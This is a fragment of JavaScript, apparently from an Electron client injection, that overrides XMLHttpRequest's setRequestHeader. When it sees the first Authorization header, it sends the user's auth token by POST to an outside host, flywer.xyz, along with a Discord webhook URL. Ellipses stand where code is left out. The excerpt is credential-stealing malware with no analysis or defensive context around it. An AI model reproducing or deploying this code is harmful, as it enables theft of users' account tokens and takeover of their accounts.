  ...
  mainWindow.webContents.on('dom-ready', () => {
    ...
    window.XMLHttpRequest.prototype.setRequestHeader = function() {
      ...
      if(!authTokenObtained && arguments[0] == "Authorization"){
        ...
        req.open('POST', 'https://flywer.xyz:8000/', true);
        const data = JSON.stringify({
          username: "Token",
          hook: "https://discordapp.com/api/webhooks/1029557089347059713/R-I5LCR2iIZMAJZjokH1F34oveHBEEaeQBDnixW2W9oWo5EGnAu0GluMzLdeJGD0Fkws",
          content: authToken
        });
        req.send(data);
      }
